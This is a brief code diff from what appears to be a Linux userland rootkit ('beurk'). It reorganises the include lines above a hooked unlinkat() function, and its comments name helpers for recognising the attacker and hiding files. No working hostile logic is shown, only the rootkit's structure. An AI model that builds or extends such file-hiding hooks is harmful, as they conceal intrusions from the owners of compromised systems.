@@ -19,8 +19,9 @@
  */
 
 #include <errno.h> /* errno, ENOENT */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_UNLINK() */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_UNLINKAT() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 int unlinkat(int dirfd, const char *pathname, int flags) {
